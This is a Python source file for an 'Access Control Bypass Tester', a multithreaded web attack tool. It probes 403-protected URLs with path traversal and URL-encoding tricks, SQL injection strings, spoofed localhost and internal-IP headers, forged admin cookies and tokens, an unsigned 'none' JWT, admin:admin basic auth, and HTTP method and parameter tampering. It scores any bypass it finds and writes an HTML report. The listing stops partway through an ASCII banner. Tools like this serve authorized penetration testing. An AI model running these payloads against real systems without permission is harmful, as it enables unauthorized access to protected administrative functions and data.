#!/usr/bin/env python3
"""
Access Control Bypass Tester v2.0
Advanced tool for testing access control bypass techniques with comprehensive analysis.
"""

import argparse
import requests
import sys
import time
import json
import yaml
import hashlib
from urllib.parse import urlparse, urljoin, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
from jinja2 import Template
import os
from tqdm import tqdm
import re
from dataclasses import dataclass, asdict
from typing import List, Dict, Optional, Tuple


@dataclass
class BypassResult:
    """Data class for bypass results"""
    url: str
    technique: str
    payload: str
    status_code: int
    response_size: int
    content_hash: str
    severity: str
    confidence: float
    description: str
    response_preview: str = ""


@dataclass
class ScanResult:
    """Data class for complete scan results"""
    target_url: str
    original_status: int
    original_size: int
    original_hash: str
    bypasses_found: List[BypassResult]
    scan_duration: float
    techniques_tested: int
    timestamp: str


class AccessBypassTester:
    def __init__(self, config_file=None, delay=1, user_agent=None, proxy=None,
                 threads=5, max_retries=3, timeout=10):
        self.config = self.load_config(config_file)
        self.delay = delay
        self.threads = threads
        self.max_retries = max_retries
        self.timeout = timeout
        self.user_agent = user_agent or self.config.get('user_agent', "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

        # Initialize session with proxy support
        self.session = requests.Session()
        if proxy:
            self.session.proxies.update({
                'http': proxy,
                'https': proxy
            })

        # Set default headers
        self.session.headers.update({
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
        })

        # Cache for responses
        self.response_cache = {}

        # Load custom techniques from config
        self.custom_techniques = self.config.get('custom_techniques', [])

    def load_config(self, config_file):
        """Load configuration from YAML file or use embedded defaults"""
        # Embedded comprehensive default configuration
        default_config = {
            'user_agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            'techniques': {
                'path_traversal': True,
                'case_manipulation': True,
                'header_manipulation': True,
                'url_encoding': True,
                'http_methods': True,
                'parameters': True,
                'double_encoding': True,
                'trailing_slash': True,
                'sql_injection': True,
                'graphql': True,
                'jwt_manipulation': True,
                'cookie_bypass': True
            },
            'severity_weights': {
                'critical': 9.0,
                'high': 7.0,
                'medium': 5.0,
                'low': 3.0,
                'info': 1.0
            },
            'custom_techniques': [
                # Network-level bypasses
                {
                    'name': "internal_network_bypass",
                    'method': "GET",
                    'headers': {
                        'X-Forwarded-For': "192.168.1.1",
                        'X-Real-IP': "10.0.0.1",
                        'X-Originating-IP': "172.16.0.1",
                        'X-Client-IP': "127.0.0.1",
                        'X-Remote-IP': "127.0.0.1"
                    }
                },
                {
                    'name': "localhost_bypass",
                    'method': "GET",
                    'headers': {
                        'X-Forwarded-For': "127.0.0.1",
                        'X-Real-IP': "localhost",
                        'X-Originating-IP': "127.0.0.1",
                        'X-Client-IP': "127.0.0.1"
                    }
                },
                {
                    'name': "ipv6_bypass",
                    'method': "GET",
                    'headers': {
                        'X-Forwarded-For': "::1",
                        'X-Real-IP': "0:0:0:0:0:0:0:1",
                        'X-Client-IP': "::1"
                    }
                },
                # Host header attacks
                {
                    'name': "host_header_bypass",
                    'method': "GET",
                    'headers': {
                        'Host': "localhost",
                        'X-Host': "127.0.0.1",
                        'X-Forwarded-Host': "127.0.0.1"
                    }
                },
                {
                    'name': "host_header_admin",
                    'method': "GET",
                    'headers': {
                        'Host': "admin.localhost",
                        'X-Forwarded-Host': "admin.localhost"
                    }
                },
                # Debug and development bypasses
                {
                    'name': "debug_parameter",
                    'method': "GET",
                    'url_suffix': "?debug=1&admin=1"
                },
                {
                    'name': "dev_mode",
                    'method': "GET",
                    'url_suffix': "?dev=true&bypass=1&internal=1"
                },
                {
                    'name': "test_mode",
                    'method': "GET",
                    'url_suffix': "?test=1&staging=1&qa=1"
                },
                {
                    'name': "maintenance_bypass",
                    'method': "GET",
                    'url_suffix': "?maintenance=false&offline=0"
                },
                # API and authentication bypasses
                {
                    'name': "api_key_bypass",
                    'method': "GET",
                    'headers': {
                        'X-API-Key': "admin",
                        'Authorization': "Bearer admin",
                        'X-Auth-Token': "admin"
                    }
                },
                {
                    'name': "basic_auth_bypass",
                    'method': "GET",
                    'headers': {
                        'Authorization': "Basic YWRtaW46YWRtaW4="  # admin:admin base64
                    }
                },
                {
                    'name': "bearer_token_admin",
                    'method': "GET",
                    'headers': {
                        'Authorization': "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
                    }
                },
                # User-Agent based bypasses
                {
                    'name': "user_agent_bypass",
                    'method': "GET",
                    'headers': {
                        'User-Agent': "admin"
                    }
                },
                {
                    'name': "user_agent_googlebot",
                    'method': "GET",
                    'headers': {
                        'User-Agent': "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
                    }
                },
                {
                    'name': "user_agent_crawler",
                    'method': "GET",
                    'headers': {
                        'User-Agent': "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
                    }
                },
                {
                    'name': "user_agent_internal",
                    'method': "GET",
                    'headers': {
                        'User-Agent': "Internal/1.0"
                    }
                },
                # Referer-based bypasses
                {
                    'name': "referer_bypass",
                    'method': "GET",
                    'headers': {
                        'Referer': "https://admin.example.com"
                    }
                },
                {
                    'name': "referer_internal",
                    'method': "GET",
                    'headers': {
                        'Referer': "http://localhost/admin",
                        'X-Referer': "http://127.0.0.1/admin"
                    }
                },
                {
                    'name': "referer_same_origin",
                    'method': "GET",
                    'headers': {
                        'Referer': "https://example.com/dashboard"
                    }
                },
                # Parameter pollution attacks
                {
                    'name': "param_pollution_admin",
                    'method': "GET",
                    'url_suffix': "?role=user&role=admin"
                },
                {
                    'name': "param_pollution_access",
                    'method': "GET",
                    'url_suffix': "?access=0&access=1"
                },
                {
                    'name': "param_pollution_level",
                    'method': "GET",
                    'url_suffix': "?level=1&level=999"
                },
                # Cookie-based bypasses (additional ones)
                {
                    'name': "cookie_admin_override",
                    'method': "GET",
                    'headers': {
                        'Cookie': "role=admin; admin=1; access=granted"
                    }
                },
                {
                    'name': "cookie_session_admin",
                    'method': "GET",
                    'headers': {
                        'Cookie': "session=admin_session; user_type=administrator"
                    }
                },
                # Protocol and method bypasses
                {
                    'name': "http_version_bypass",
                    'method': "GET",
                    'headers': {
                        'Connection': "keep-alive",
                        'Upgrade': "h2c"
                    }
                },
                # Encoding and obfuscation bypasses
                {
                    'name': "unicode_bypass",
                    'method': "GET",
                    'url_suffix': "%u0061%u0064%u006d%u0069%u006e"  # /admin in unicode
                },
                {
                    'name': "hex_encoding",
                    'method': "GET",
                    'url_suffix': "%61%64%6d%69%6e"  # /admin in hex
                },
                # Time-based bypasses
                {
                    'name': "timestamp_bypass",
                    'method': "GET",
                    'url_suffix': "?timestamp=9999999999&_t=9999999999"
                },
                # Origin and CORS bypasses
                {
                    'name': "origin_bypass",
                    'method': "GET",
                    'headers': {
                        'Origin': "https://admin.example.com",
                        'X-Origin': "https://admin.example.com"
                    }
                },
                # Custom header injections
                {
                    'name': "x_custom_admin",
                    'method': "GET",
                    'headers': {
                        'X-Custom-Auth': "admin",
                        'X-Internal-Auth': "true",
                        'X-Bypass-Auth': "1"
                    }
                },
                # GraphQL-specific bypasses
                {
                    'name': "graphql_introspection",
                    'method': "POST",
                    'headers': {
                        'Content-Type': "application/json"
                    },
                    'data': '{"query": "{__schema{types{name}}}", "variables": null}'
                },
                # REST API bypasses
                {
                    'name': "rest_admin_override",
                    'method': "GET",
                    'url_suffix': "/admin",
                    'headers': {
                        'X-HTTP-Method-Override': "GET",
                        'X-Method-Override': "GET"
                    }
                },
                # WebSocket upgrade bypasses
                {
                    'name': "websocket_upgrade",
                    'method': "GET",
                    'headers': {
                        'Upgrade': "websocket",
                        'Connection': "Upgrade",
                        'Sec-WebSocket-Key': "dGhlIHNhbXBsZSBub25jZQ==",
                        'Sec-WebSocket-Version': "13"
                    }
                },
                # Range header bypasses
                {
                    'name': "range_header_bypass",
                    'method': "GET",
                    'headers': {
                        'Range': "bytes=0-1023",
                        'X-Range': "0-1023"
                    }
                },
                # Accept header bypasses
                {
                    'name': "accept_admin",
                    'method': "GET",
                    'headers': {
                        'Accept': "application/admin+json",
                        'X-Accept': "admin/*"
                    }
                },
                # Content-Type bypasses
                {
                    'name': "content_type_admin",
                    'method': "GET",
                    'headers': {
                        'Content-Type': "application/x-admin",
                        'X-Content-Type': "admin/*"
                    }
                }
            ],
            'advanced': {
                'min_confidence': 0.5,
                'content_analysis': {
                    'admin_keywords': ["admin", "dashboard", "control", "panel", "manage", "config", "settings", "administrator", "root", "superuser", "backend", "console"],
                    'error_keywords': ["403", "forbidden", "access denied", "unauthorized", "permission denied", "not allowed", "restricted"]
                },
                'performance': {
                    'max_response_size': 1048576,  # 1MB
                    'enable_cache': True
                }
            }
        }

        # Try to load external config file
        if config_file:
            config_paths = [
                config_file,  # As provided
                os.path.join(os.getcwd(), config_file),  # Relative to current directory
                os.path.join(os.path.dirname(os.path.abspath(__file__)), config_file),  # Relative to script/binary
            ]

            for config_path in config_paths:
                if os.path.exists(config_path):
                    try:
                        with open(config_path, 'r') as f:
                            user_config = yaml.safe_load(f)
                        default_config.update(user_config)
                        print(f"[+] Loaded configuration from: {config_path}")
                        break
                    except Exception as e:
                        print(f"Warning: Could not load config file {config_path}: {e}")
                        continue
            else:
                # No config file found in any location
                if config_file != 'config.yaml':  # Only warn if user specified a specific file
                    print(f"Warning: Config file not found: {config_file}")

        return default_config

    def make_request(self, url, method='GET', headers=None, data=None, cookies=None, allow_redirects=False):
        """Make HTTP request with retry logic and caching"""
        cache_key = hashlib.md5(f"{method}{url}{str(headers)}{str(data)}{str(cookies)}".encode()).hexdigest()

        if cache_key in self.response_cache:
            return self.response_cache[cache_key]

        for attempt in range(self.max_retries):
            try:
                # Merge session cookies with request-specific cookies
                request_cookies = dict(self.session.cookies)
                if cookies:
                    request_cookies.update(cookies)

                response = self.session.request(
                    method=method,
                    url=url,
                    headers=headers,
                    data=data,
                    cookies=request_cookies,
                    allow_redirects=allow_redirects,
                    timeout=self.timeout
                )
                self.response_cache[cache_key] = response
                return response
            except Exception as e:
                if attempt == self.max_retries - 1:
                    raise e
                time.sleep(self.delay * (attempt + 1))

    def analyze_response_content(self, response, original_response):
        """Analyze response content to determine if bypass was successful"""
        if response.status_code == 403:
            return False, 0.0, "Still blocked"

        # Calculate content differences
        original_size = len(original_response.content) if original_response else 0
        response_size = len(response.content)

        # Content hash comparison
        original_hash = hashlib.md5(original_response.content).hexdigest() if original_response else ""
        response_hash = hashlib.md5(response.content).hexdigest()

        # Size difference analysis
        size_diff = abs(response_size - original_size)
        size_ratio = response_size / original_size if original_size > 0 else 1

        # Content type analysis
        content_type = response.headers.get('content-type', '').lower()
        is_html = 'text/html' in content_type
        is_json = 'application/json' in content_type

        # HTML content analysis
        confidence = 0.0
        description = ""

        if is_html and response.content:
            soup = BeautifulSoup(response.content, 'html.parser')

            # Look for admin indicators
            admin_keywords = ['admin', 'dashboard', 'control', 'panel', 'manage', 'config']
            admin_score = sum(1 for keyword in admin_keywords if keyword.lower() in soup.get_text().lower())

            # Look for forms and interactive elements
            forms = len(soup.find_all('form'))
            buttons = len(soup.find_all(['button', 'input'], {'type': ['submit', 'button']}))

            # Calculate confidence based on content analysis
            if admin_score > 2:
                confidence += 0.4
                description += f"Admin keywords found ({admin_score}); "
            if forms > 0:
                confidence += 0.3
                description += f"Forms detected ({forms}); "
            if buttons > 2:
                confidence += 0.2
                description += f"Interactive elements found ({buttons}); "

            # Check for error pages
            error_keywords = ['403', 'forbidden', 'access denied', 'unauthorized']
            error_score = sum(1 for keyword in error_keywords if keyword.lower() in soup.get_text().lower())
            if error_score > 0:
                confidence -= 0.3
                description += f"Error indicators found ({error_score}); "

        elif is_json and response.content:
            try:
                json_data = response.json()
                # Look for successful API responses
                if isinstance(json_data, dict):
                    success_indicators = ['success', 'data', 'result', 'admin']
                    success_score = sum(1 for key in success_indicators if key in json_data)
                    if success_score > 0:
                        confidence += 0.5
                        description += f"JSON success indicators ({success_score}); "
            except:
                pass

        # Status code analysis
        if 200 <= response.status_code < 300:
            confidence += 0.3
        elif 300 <= response.status_code < 400:
            confidence += 0.1  # Redirects might still be bypasses
        elif response.status_code >= 500:
            confidence -= 0.2  # Server errors are usually not bypasses

        # Size analysis
        if size_ratio > 1.5:  # Much larger response
            confidence += 0.2
            description += f"Response size increased ({size_ratio:.1f}x); "
        elif size_ratio < 0.5:  # Much smaller response
            confidence -= 0.1
            description += f"Response size decreased ({size_ratio:.1f}x); "

        # Hash comparison
        if response_hash != original_hash:
            confidence += 0.1
            description += "Content differs from original; "

        confidence = max(0.0, min(1.0, confidence))

        return confidence > 0.3, confidence, description.strip()

    def calculate_severity(self, technique, confidence, status_code):
        """Calculate severity score for a bypass"""
        base_scores = {
            'path_traversal': 8.0,
            'sql_injection': 9.0,
            'header_manipulation': 6.0,
            'jwt_manipulation': 8.0,
            'cookie_bypass': 7.0,
            'case_manipulation': 4.0,
            'url_encoding': 5.0,
            'http_methods': 3.0,
            'parameters': 4.0,
            'double_encoding': 5.0,
            'trailing_slash': 2.0,
            'graphql': 7.0
        }

        base_score = base_scores.get(technique, 5.0)

        # Adjust based on confidence and status code
        if confidence > 0.7:
            base_score += 1.0
        elif confidence < 0.4:
            base_score -= 1.0

        if status_code == 200:
            base_score += 0.5
        elif 300 <= status_code < 400:
            base_score -= 0.5

        return min(10.0, max(1.0, base_score))

    def get_severity_level(self, score):
        """Convert severity score to level"""
        if score >= 9.0:
            return "critical"
        elif score >= 7.0:
            return "high"
        elif score >= 5.0:
            return "medium"
        elif score >= 3.0:
            return "low"
        else:
            return "info"

    def test_single_technique(self, url, original_response, technique_func, technique_name):
        """Test a single bypass technique"""
        bypasses = []

        try:
            results = technique_func(url, original_response)
            for result in results:
                if isinstance(result, tuple) and len(result) == 3:
                    test_url, status_code, response = result

                    # Analyze the response
                    is_bypass, confidence, description = self.analyze_response_content(response, original_response)

                    if is_bypass:
                        severity_score = self.calculate_severity(technique_name, confidence, status_code)
                        severity_level = self.get_severity_level(severity_score)

                        # Get response preview
                        content_preview = ""
                        if hasattr(response, 'content') and response.content:
                            content_preview = response.content.decode('utf-8', errors='ignore')[:200]

                        bypass = BypassResult(
                            url=test_url,
                            technique=technique_name,
                            payload=test_url.replace(url, ''),
                            status_code=status_code,
                            response_size=len(response.content) if hasattr(response, 'content') else 0,
                            content_hash=hashlib.md5(response.content).hexdigest() if hasattr(response, 'content') else "",
                            severity=severity_level,
                            confidence=confidence,
                            description=description,
                            response_preview=content_preview
                        )
                        bypasses.append(bypass)
                else:
                    # Skip invalid results
                    continue

        except Exception as e:
            pass  # Silently handle technique failures

        return bypasses

    def test_url(self, url):
        """Test a single URL for access control bypasses"""
        start_time = time.time()

        try:
            original_response = self.make_request(url, allow_redirects=False)
            original_status = original_response.status_code
            original_size = len(original_response.content)
            original_hash = hashlib.md5(original_response.content).hexdigest()
        except Exception as e:
            return ScanResult(
                target_url=url,
                original_status=0,
                original_size=0,
                original_hash="",
                bypasses_found=[],
                scan_duration=time.time() - start_time,
                techniques_tested=0,
                timestamp=time.strftime("%Y-%m-%d %H:%M:%S")
            )

        if original_status != 403:
            return ScanResult(
                target_url=url,
                original_status=original_status,
                original_size=original_size,
                original_hash=original_hash,
                bypasses_found=[],
                scan_duration=time.time() - start_time,
                techniques_tested=0,
                timestamp=time.strftime("%Y-%m-%d %H:%M:%S")
            )

        bypasses_found = []
        techniques_tested = 0

        # Define all techniques
        techniques = []

        if self.config['techniques'].get('path_traversal', True):
            techniques.append((self.path_traversal_bypass, 'path_traversal'))
        if self.config['techniques'].get('case_manipulation', True):
            techniques.append((self.case_manipulation_bypass, 'case_manipulation'))
        if self.config['techniques'].get('header_manipulation', True):
            techniques.append((self.header_manipulation_bypass, 'header_manipulation'))
        if self.config['techniques'].get('url_encoding', True):
            techniques.append((self.url_encoding_bypass, 'url_encoding'))
        if self.config['techniques'].get('http_methods', True):
            techniques.append((self.http_methods_bypass, 'http_methods'))
        if self.config['techniques'].get('parameters', True):
            techniques.append((self.parameter_bypass, 'parameters'))
        if self.config['techniques'].get('double_encoding', True):
            techniques.append((self.double_encoding_bypass, 'double_encoding'))
        if self.config['techniques'].get('trailing_slash', True):
            techniques.append((self.trailing_slash_bypass, 'trailing_slash'))
        if self.config['techniques'].get('sql_injection', True):
            techniques.append((self.sql_injection_bypass, 'sql_injection'))
        if self.config['techniques'].get('graphql', True):
            techniques.append((self.graphql_bypass, 'graphql'))
        if self.config['techniques'].get('jwt_manipulation', True):
            techniques.append((self.jwt_manipulation_bypass, 'jwt_manipulation'))
        if self.config['techniques'].get('cookie_bypass', True):
            techniques.append((self.cookie_bypass, 'cookie_bypass'))

        # Add custom techniques
        for custom_technique in self.custom_techniques:
            techniques.append((lambda u, o, ct=custom_technique: self.custom_technique_bypass(u, o, ct), custom_technique['name']))

        # Test each technique
        for technique_func, technique_name in techniques:
            techniques_tested += 1
            result = self.test_single_technique(url, original_response, technique_func, technique_name)
            bypasses_found.extend(result)
            time.sleep(self.delay)

        scan_duration = time.time() - start_time

        return ScanResult(
            target_url=url,
            original_status=original_status,
            original_size=original_size,
            original_hash=original_hash,
            bypasses_found=bypasses_found,
            scan_duration=scan_duration,
            techniques_tested=techniques_tested,
            timestamp=time.strftime("%Y-%m-%d %H:%M:%S")
        )

    def test_urls_multithreaded(self, urls):
        """Test multiple URLs using multi-threading"""
        results = {}

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # Submit all tasks
            future_to_url = {executor.submit(self.test_url, url): url for url in urls}

            # Process results as they complete
            with tqdm(total=len(urls), desc="Testing URLs") as pbar:
                for future in as_completed(future_to_url):
                    url = future_to_url[future]
                    try:
                        result = future.result()
                        results[url] = result
                    except Exception as e:
                        print(f"Error testing {url}: {e}")
                    pbar.update(1)

        return results

    # Bypass technique implementations
    def path_traversal_bypass(self, url, original_response):
        """Test path traversal techniques"""
        results = []
        parsed = urlparse(url)

        payloads = [
            f"{parsed.path}/.",
            f"{parsed.path}/..",
            f"{parsed.path}/../",
            f"{parsed.path}%2e%2e%2f",
            f"{parsed.path}..;/",
            f"{parsed.path};/",
            f"{parsed.path};/admin",
            f"{parsed.path}/admin/..",
            f"{parsed.path}//admin//",
        ]

        for payload in payloads:
            test_url = f"{parsed.scheme}://{parsed.netloc}{payload}"
            try:
                response = self.make_request(test_url, allow_redirects=False)
                if response:
                    results.append((test_url, response.status_code, response))
            except:
                pass

        return results

    def case_manipulation_bypass(self, url, original_response):
        """Test case manipulation"""
        results = []
        parsed = urlparse(url)

        variations = [
            parsed.path.upper(),
            parsed.path.lower(),
            parsed.path.title(),
            parsed.path.replace('admin', 'Admin'),
            parsed.path.replace('admin', 'ADMIN'),
        ]

        for variation in variations:
            test_url = f"{parsed.scheme}://{parsed.netloc}{variation}"
            try:
                response = self.make_request(test_url, allow_redirects=False)
                if response:
                    results.append((test_url, response.status_code, response))
            except:
                pass

        return results

    def header_manipulation_bypass(self, url, original_response):
        """Test header manipulation techniques"""
        results = []

        headers_to_test = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Remote-Addr': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'X-Host': '127.0.0.1'},
            {'X-Forwarded-Host': '127.0.0.1'},
            {'Referer': url},
            {'X-Custom-IP-Authorization': '127.0.0.1'},
            {'X-Original-URL': url},
            {'X-Rewrite-URL': url},
        ]

        for header_dict in headers_to_test:
            try:
                response = self.make_request(url, headers=header_dict, allow_redirects=False)
                if response:
                    header_name = list(header_dict.keys())[0]
                    results.append((f"{url} (Header: {header_name})", response.status_code, response))
            except:
                pass

        return results

    def url_encoding_bypass(self, url, original_response):
        """Test URL encoding bypasses"""
        results = []
        parsed = urlparse(url)

        encoded_paths = [
            quote(parsed.path),
            quote(parsed.path, safe=''),
            parsed.path.replace('/', '%2F'),
            parsed.path.replace('/', '%5C'),
        ]

        for encoded_path in encoded_paths:
            test_url = f"{parsed.scheme}://{parsed.netloc}{encoded_path}"
            try:
                response = self.make_request(test_url, allow_redirects=False)
                if response:
                    results.append((test_url, response.status_code, response))
            except:
                pass

        return results

    def http_methods_bypass(self, url, original_response):
        """Test different HTTP methods"""
        results = []

        methods = ['HEAD', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH', 'TRACE', 'CONNECT']

        for method in methods:
            try:
                response = self.make_request(url, method=method, allow_redirects=False)
                if response:
                    results.append((f"{url} ({method})", response.status_code, response))
            except:
                pass

        return results

    def parameter_bypass(self, url, original_response):
        """Test parameter-based bypasses"""
        results = []

        params = [
            '?admin=true',
            '?debug=true',
            '?bypass=true',
            '?access=admin',
            '?role=admin',
            '?user=admin',
            '?auth=1',
            '?authorized=1',
            '?admin=1',
            '?superuser=1',
        ]

        for param in params:
            test_url = url + param
            try:
                response = self.make_request(test_url, allow_redirects=False)
                if response:
                    results.append((test_url, response.status_code, response))
            except:
                pass

        return results

    def double_encoding_bypass(self, url, original_response):
        """Test double encoding"""
        results = []
        parsed = urlparse(url)

        double_encoded = parsed.path.replace('/', '%252f').replace('\\', '%255c')

        test_url = f"{parsed.scheme}://{parsed.netloc}{double_encoded}"
        try:
            response = self.make_request(test_url, allow_redirects=False)
            if response:
                results.append((test_url, response.status_code, response))
        except:
            pass

        return results

    def trailing_slash_bypass(self, url, original_response):
        """Test trailing slash variations"""
        results = []
        parsed = urlparse(url)

        variations = [
            parsed.path.rstrip('/') + '/',
            parsed.path.rstrip('/'),
            parsed.path + '//',
            parsed.path.rstrip('/') + '/./',
        ]

        for variation in variations:
            if variation != parsed.path:
                test_url = f"{parsed.scheme}://{parsed.netloc}{variation}"
                try:
                    response = self.make_request(test_url, allow_redirects=False)
                    results.append((test_url, response.status_code, response))
                except:
                    pass

        return results

    def sql_injection_bypass(self, url, original_response):
        """Test SQL injection in paths"""
        results = []
        parsed = urlparse(url)

        sql_payloads = [
            f"{parsed.path}' OR '1'='1",
            f"{parsed.path}' OR 1=1 --",
            f"{parsed.path}1' UNION SELECT 1 --",
            f"{parsed.path}admin' --",
            f"{parsed.path}%27%20OR%20%271%27%3D%271",
        ]

        for payload in sql_payloads:
            test_url = f"{parsed.scheme}://{parsed.netloc}{payload}"
            try:
                response = self.make_request(test_url, allow_redirects=False)
                if response:
                    results.append((test_url, response.status_code, response))
            except:
                pass

        return results

    def graphql_bypass(self, url, original_response):
        """Test GraphQL bypasses"""
        results = []

        graphql_payloads = [
            '/graphql?query={admin}',
            '/graphql?query={users}',
            '/graphiql',
            '/api/graphql',
        ]

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        for payload in graphql_payloads:
            test_url = base_url + payload
            try:
                response = self.make_request(test_url, allow_redirects=False)
                if response:
                    results.append((test_url, response.status_code, response))
            except:
                pass

        return results

    def jwt_manipulation_bypass(self, url, original_response):
        """Test JWT manipulation"""
        results = []

        # Common JWT bypass headers
        jwt_headers = [
            {'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.'},
            {'Authorization': 'Bearer admin'},
            {'X-JWT-Assertion': 'admin'},
        ]

        for header_dict in jwt_headers:
            try:
                response = self.make_request(url, headers=header_dict, allow_redirects=False)
                if response:
                    header_name = list(header_dict.keys())[0]
                    results.append((f"{url} (JWT: {header_name})", response.status_code, response))
            except:
                pass

        return results

    def cookie_bypass(self, url, original_response):
        """Test cookie-based bypasses"""
        results = []

        cookie_payloads = [
            {'admin': '1'},
            {'role': 'admin'},
            {'user': 'admin'},
            {'auth': '1'},
            {'authorized': 'true'},
            {'session': 'admin'},
        ]

        for cookie_dict in cookie_payloads:
            try:
                response = self.make_request(url, cookies=cookie_dict, allow_redirects=False)
                if response:
                    cookie_name = list(cookie_dict.keys())[0]
                    results.append((f"{url} (Cookie: {cookie_name}={cookie_dict[cookie_name]})", response.status_code, response))
            except:
                pass

        return results

    def custom_technique_bypass(self, url, original_response, technique_config):
        """Execute custom technique from config"""
        results = []

        try:
            method = technique_config.get('method', 'GET')
            headers = technique_config.get('headers', {})
            data = technique_config.get('data')
            url_suffix = technique_config.get('url_suffix', '')

            test_url = url + url_suffix
            response = self.make_request(test_url, method=method, headers=headers, data=data, allow_redirects=False)
            if response:
                results.append((test_url, response.status_code, response))
        except:
            pass

        return results

    def generate_html_report(self, results, output_file):
        """Generate HTML report with charts and statistics"""
        html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>Access Control Bypass Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .summary { background: #f0f0f0; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
        .bypass { border: 1px solid #ddd; margin: 10px 0; padding: 15px; border-radius: 5px; }
        .critical { border-left: 5px solid #ff0000; }
        .high { border-left: 5px solid #ff8000; }
        .medium { border-left: 5px solid #ffff00; }
        .low { border-left: 5px solid #80ff00; }
        .info { border-left: 5px solid #00ff00; }
        .stats { display: flex; justify-content: space-around; margin: 20px 0; }
        .stat { text-align: center; padding: 10px; background: #f9f9f9; border-radius: 5px; }
    </style>
</head>
<body>
    <h1>Access Control Bypass Report</h1>
    <div class="summary">
        <h2>Summary</h2>
        <p><strong>Total URLs Tested:</strong> {{ total_urls }}</p>
        <p><strong>URLs with Bypasses:</strong> {{ urls_with_bypasses }}</p>
        <p><strong>Total Bypasses Found:</strong> {{ total_bypasses }}</p>
        <p><strong>Scan Duration:</strong> {{ scan_duration }}s</p>
        <p><strong>Generated:</strong> {{ timestamp }}</p>
    </div>

    <div class="stats">
        <div class="stat">
            <h3>Critical</h3>
            <div style="font-size: 24px; color: #ff0000;">{{ severity_counts.critical }}</div>
        </div>
        <div class="stat">
            <h3>High</h3>
            <div style="font-size: 24px; color: #ff8000;">{{ severity_counts.high }}</div>
        </div>
        <div class="stat">
            <h3>Medium</h3>
            <div style="font-size: 24px; color: #ffff00;">{{ severity_counts.medium }}</div>
        </div>
        <div class="stat">
            <h3>Low</h3>
            <div style="font-size: 24px; color: #80ff00;">{{ severity_counts.low }}</div>
        </div>
    </div>

    <h2>Detailed Results</h2>
    {% for url, result in results.items() %}
    <div class="url-result">
        <h3>{{ url }}</h3>
        <p><strong>Original Status:</strong> {{ result.original_status }}</p>
        <p><strong>Techniques Tested:</strong> {{ result.techniques_tested }}</p>
        <p><strong>Scan Duration:</strong> {{ "%.2f"|format(result.scan_duration) }}s</p>

        {% if result.bypasses_found %}
        <h4>Bypasses Found ({{ result.bypasses_found|length }}):</h4>
        {% for bypass in result.bypasses_found %}
        <div class="bypass {{ bypass.severity }}">
            <h5>{{ bypass.technique }} - {{ bypass.severity|upper }}</h5>
            <p><strong>URL:</strong> {{ bypass.url }}</p>
            <p><strong>Status:</strong> {{ bypass.status_code }}</p>
            <p><strong>Confidence:</strong> {{ "%.1%"|format(bypass.confidence) }}</p>
            <p><strong>Description:</strong> {{ bypass.description }}</p>
            {% if bypass.response_preview %}
            <details>
                <summary>Response Preview</summary>
                <pre>{{ bypass.response_preview }}</pre>
            </details>
            {% endif %}
        </div>
        {% endfor %}
        {% else %}
        <p>No bypasses found.</p>
        {% endif %}
    </div>
    {% endfor %}
</body>
</html>
        """

        # Calculate statistics
        total_urls = len(results)
        urls_with_bypasses = sum(1 for r in results.values() if r.bypasses_found)
        total_bypasses = sum(len(r.bypasses_found) for r in results.values())
        scan_duration = sum(r.scan_duration for r in results.values())

        severity_counts = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0}
        for result in results.values():
            for bypass in result.bypasses_found:
                severity_counts[bypass.severity] += 1

        template = Template(html_template)
        html_content = template.render(
            total_urls=total_urls,
            urls_with_bypasses=urls_with_bypasses,
            total_bypasses=total_bypasses,
            scan_duration=f"{scan_duration:.2f}",
            severity_counts=severity_counts,
            results=results,
            timestamp=time.strftime("%Y-%m-%d %H:%M:%S")
        )

        with open(output_file, 'w') as f:
            f.write(html_content)


def load_urls_from_file(file_path):
    """Load URLs from a text file"""
    urls = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    urls.append(line)
    except Exception as e:
        print(f"Error reading file {file_path}: {e}")
        sys.exit(1)

    return urls


def print_banner():
    """Print the tool banner featuring Hermes, the cunning trickster god"""
    banner = """
    ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
    ║                                                                                                        ║
    ║        ╔══════════════════════════════════════════════════════════════════════════════════════════════╗    ║
    ║        ║                                  HERMES - THE TRICKSTER                                   ║    ║
    ║        ║                                                                                            ║    ║
    ║        ║                    .-~~~~~~~~~-._                                         _.-~~~~~~~~~-.     ║    ║
    ║        ║                   /     HERMES    \\                                     /     ACCESS     \\    ║    ║
    ║        ║                  |   THE CUNNING   |                                   |   BYPASS TESTER  |   ║    ║
    ║        ║                  |    MESSENGER    |                                   |       v2.0       |   ║    ║
    ║        ║                   \\  OF THE GODS  /                                     \\   ADVANCED     /    ║    ║
    ║        ║                    `~~~~~~~~~~~~~'                                       `~~~~~~~~~~~~~'     ║    ║
    ║        ║                                                                                            ║    ║
